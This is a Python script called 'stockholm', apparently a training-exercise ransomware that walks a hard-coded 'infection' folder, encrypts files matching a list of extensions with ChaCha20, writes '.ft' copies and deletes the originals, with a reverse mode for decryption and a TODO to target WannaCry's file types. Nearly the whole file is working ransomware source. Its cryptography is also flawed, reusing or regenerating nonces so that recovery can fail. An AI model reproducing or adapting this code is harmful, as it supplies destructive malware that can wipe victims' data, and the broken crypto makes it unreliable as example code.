#!/usr/bin/env python3

# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os
from typing import Any
from pathlib import Path
import secrets
from functools import partial

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

VERSION = 1.0
# TARGET_FOLDER = "/home/tfrily/goinfre/LivreIT"
TARGET_FOLDER = "/home/camille/infection/LivreIT"
#Encrypt TARGET_FOLDER = Path.home().as_posix() + "/infection" 

def get_extentions(path_to_file: str) -> dict:
    d = {}
    with open(path_to_file) as f:
        for line in f:
            d[line.rstrip().split('.')[1]] = line.rstrip()
    return d

def create_key() -> bytes:
        key = secrets.token_bytes(32)
        return key

def encrypt_data(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
    
    # Create a ChaCha20 cipher object
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Encrypt the plaintext
    ciphertext = encryptor.update(plaintext)
    
    # Encrypt the plaintext
    return ciphertext

def decrypt_data(key: bytes,nonce: bytes ,encrypted_data: bytes) -> bytes:
    
    # Create a Cipher object
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    
    # Decrypt the ciphertext
    plaintext = decryptor.update(encrypted_data) 
    
    return plaintext

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def write_content_file(path_to_file: str, content: Any):
    with open(path_to_file, 'wb') as file:
        content = file.write(content)
        file.close()

def remove_file(path_to_file: str):
    os.remove(path_to_file)

def encrypt_file(path_to_file: str, new_file: str, key: bytes, nonce: bytes):
        with open(path_to_file,'rb') as r_file:
            with open(new_file, 'wb') as w_file:
                for line in r_file:
                    w_file.write(encrypt_data(key,nonce, line))
                w_file.close()
        r_file.close()


def decrypt_file(file_to_decrypt: str, new_file:str ,key: bytes, nonce:bytes):
        with open(file_to_decrypt,'rb') as r_file:
            with open(new_file, 'wb') as w_file:
                for line in r_file:
                    w_file.write(decrypt_data(key,nonce, line))
                w_file.close()
        r_file.close()

def stockholm(key: bytes, nonce:bytes ,s: bool):
    extentions = get_extentions("extensions.txt")
    # files = get_files(infection_dir)
    for root, subdirs, files in os.walk(TARGET_FOLDER):
            for file in files:
                try:
                    if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
                        print(f"File TO Encrypt {file}")
                        # print(f"FILE {os.path.join(root,file)}")
                        encrypt_file(os.path.join(root, file), os.path.join(root, file + ".ft"), key, nonce)
                        # write_content_file(os.path.join(root, file + ".ft"), )
                        remove_file(os.path.join(root, file))
                    if s is True:
                        print(f"Encrypted file {file}")
                except Exception as e:
                    print(f"Failed for {e}")
                    continue

def reverse_stockholm(key: bytes, nonce: bytes):
    for root, subdirs, files in os.walk(TARGET_FOLDER):
            for file in files:
                try:
                    if file.split('.')[-1] == "ft":
                        print(f"File TO decrypt {file}")
                        file_path, ext = os.path.splitext(os.path.join(root, file))
                        decrypt_file(os.path.join(root, file),file_path ,key, nonce)
                        # write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                        remove_file(os.path.join(root, file))
                except Exception as e:
                    print(f"Failed for {e}")
                    continue

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-r", "--reverse", type=str, help="reverse the encryption")
    group.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
    group.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
    parser.add_argument("-s", "--silent", action="store_true", help="silence the output")
    args = parser.parse_args()
    try:
        key = None
        nonce = secrets.token_bytes(16)
        if args.version:
            print(f"stockholm version {VERSION}")
            exit(1)
        if args.key is not None:
            key = args.key
        if args.reverse is None:
            if key is None:
                key = create_key()
                print(f"The key {key.hex()}")
            if not args.silent:
                print(f"Open the file")
                with open("/home/camille/infection/LivreIT/testPDF",'ab') as f_test:
                    with open("/home/camille/infection/LivreIT/algorithmicthinking_aproblem-basedintroduction.pdf",'rb') as f:
                        while True:
                            chunk = f.read(2000000)
                            if not chunk:
                                break
                            f_test.write(encrypt_data(key,nonce,chunk))
                        f.close()
                f_test.close()

                with open("/home/camille/infection/LivreIT/testPDF_recover",'ab') as f_recover:
                    with open("/home/camille/infection/LivreIT/testPDF",'rb') as f_test:
                        while True:
                            chunk = f_test.read(2000000)
                            if not chunk:
                                break
                            f_recover.write(decrypt_data(key,nonce,chunk))
                        f_test.close()
                    f_recover.close()
                # stockholm(key,nonce, True)
                # reverse_stockholm(key,nonce)
            else:
                stockholm(key,nonce, False)

        if args.reverse is not None:
            reverse_stockholm(bytes(args.reverse, 'utf-8'),nonce)
        exit(1)
    except Exception as e:
        print(f"Failed for {e}")


if __name__ == "__main__":
    main()
